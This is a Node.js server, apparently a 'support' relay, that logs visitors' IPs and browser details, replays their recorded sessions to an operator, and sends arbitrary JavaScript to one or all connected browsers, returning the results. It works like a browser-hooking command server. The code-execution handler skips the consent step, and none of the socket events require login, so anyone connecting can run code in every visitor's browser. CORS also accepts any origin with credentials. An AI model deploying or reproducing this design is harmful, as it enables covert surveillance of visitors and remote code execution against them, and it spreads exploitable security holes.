const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const session = require('express-session');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const bcrypt = require('bcrypt');
const crypto = require('crypto');
const cors = require('cors');

const app = express();

app.use(cors({ origin: '*', methods: ['GET', 'POST'], credentials: true }));

const server = http.createServer(app);

const io = new Server(server, { 
    cors: { origin: '*', methods: ["GET", "POST"], credentials: true },
    allowEIO3: true
});

const db = new sqlite3.Database('./data/support.db', (err) => {
    if (err) console.error('[DB] Connection error:', err.message);
    else console.log('[DB] Connected to SQLite database.');
});

db.serialize(() => {
    // Admins table
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password_hash TEXT
    )`);

    // NEW: Connection History table
    db.run(`CREATE TABLE IF NOT EXISTS history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        socket_id TEXT,
        ip_address TEXT,
        browser TEXT,
        os TEXT,
        origin TEXT,
        connected_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.get(`SELECT * FROM users WHERE username = 'admin'`, async (err, row) => {
        if (!row) {
            const rawPassword = crypto.randomBytes(6).toString('hex');
            const salt = await bcrypt.genSalt(10);
            const hash = await bcrypt.hash(rawPassword, salt);
            db.run(`INSERT INTO users (username, password_hash) VALUES (?, ?)`, ['admin', hash], (insertErr) => {
                if (!insertErr) {
                    console.log('\n======================================================');
                    console.log('🚨 SYSTEM INITIALIZATION 🚨');
                    console.log('Admin account created successfully.');
                    console.log(`USERNAME: admin`);
                    console.log(`PASSWORD: ${rawPassword}`);
                    console.log('Save this password! It will not be shown again.');
                    console.log('======================================================\n');
                }
            });
        }
    });
});

app.use(session({
    secret: crypto.randomBytes(32).toString('hex'),
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false, httpOnly: true }
}));
app.use(express.urlencoded({ extended: true })); 
app.use(express.json());

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    db.get(`SELECT * FROM users WHERE username = ?`, [username], async (err, user) => {
        if (err || !user) return res.status(401).send('Invalid credentials. <a href="/">Try again</a>');
        const match = await bcrypt.compare(password, user.password_hash);
        if (match) {
            req.session.isAuthenticated = true;
            res.redirect('/operator');
        } else { res.status(401).send('Invalid credentials. <a href="/">Try again</a>'); }
    });
});

function requireAuth(req, res, next) {
    if (req.session && req.session.isAuthenticated) {
        res.setHeader('Cache-Control', 'no-cache, private, no-store, must-revalidate, max-stale=0, post-check=0, pre-check=0');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '-1');
        return next();
    }

    res.redirect('/');
}

app.get('/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) {
            console.error('[SYS] Error destroying session:', err);
            return res.status(500).send('Error logging out.');
        }
        res.redirect('/');
    });
});

app.get('/operator', requireAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'private', 'operator.html'));
});

app.use(express.static('public'));

// --- MULTI-USER STREAM RELAY ---
const activeClients = new Map();

io.on('connection', (socket) => {
    console.log(`[SYS] Clean connection pipeline opened: ${socket.id}`);

    socket.on('register-admin', () => {
        socket.join('admin_room');
        socket.emit('active-clients-list', Array.from(activeClients.values()));
    });

    socket.on('register-specs', (metadata) => {
        const clientData = { id: socket.id, browser: metadata.browser, os: metadata.os, origin: metadata.origin };
        activeClients.set(socket.id, clientData);
        socket.join(`room_${socket.id}`);
        io.to('admin_room').emit('active-clients-list', Array.from(activeClients.values()));

        // NEW: Log this connection to the database
        // We check 'x-forwarded-for' in case you are behind a reverse proxy or Docker
        const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
        db.run(`INSERT INTO history (socket_id, ip_address, browser, os, origin) VALUES (?, ?, ?, ?, ?)`, 
            [socket.id, ip, metadata.browser, metadata.os, metadata.origin]
        );
    });

    socket.on('watch-client', (targetClientId) => {
        if (socket.currentWatchingRoom) socket.leave(socket.currentWatchingRoom);
        const newRoom = `room_${targetClientId}`;
        socket.join(newRoom);
        socket.currentWatchingRoom = newRoom;
        io.to(targetClientId).emit('request-snapshot');
    });

    socket.on('record-event', (event) => socket.to(`room_${socket.id}`).emit('replay-event', event));
    socket.on('request-control', (targetClientId) => io.to(targetClientId).emit('control-requested'));
    socket.on('operator-action', (data) => io.to(data.targetClientId).emit('execute-action', data));
    socket.on('control-approved', () => socket.to(`room_${socket.id}`).emit('control-approved'));
    socket.on('control-denied', () => socket.to(`room_${socket.id}`).emit('control-denied'));


    socket.on('admin-execute-js', (data) => {
        // data contains: { targetClientId, code }
        if (data.targetClientId === 'all') {
            socket.broadcast.emit('execute-js', data.code);
        } else {
            io.to(data.targetClientId).emit('execute-js', data.code);
        }
    });

    socket.on('client-js-result', (resultData) => {
        // Pass the result from the target browser back to the Admin room
        io.to('admin_room').emit('admin-js-result', resultData);
    });

    // ... socket.on('disconnect', ...) ...

    // NEW: Fetch history for the admin panel
    socket.on('request-history', () => {
        // Fetch the 100 most recent connections
        db.all(`SELECT * FROM history ORDER BY connected_at DESC LIMIT 100`, [], (err, rows) => {
            if (!err) socket.emit('history-data', rows);
        });
    });

    socket.on('disconnect', () => {
        if (activeClients.has(socket.id)) {
            activeClients.delete(socket.id);
            io.to('admin_room').emit('active-clients-list', Array.from(activeClients.values()));
        }
    });
});

const PORT = 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`[SYS] Relay active at 0.0.0.0:${PORT}`));
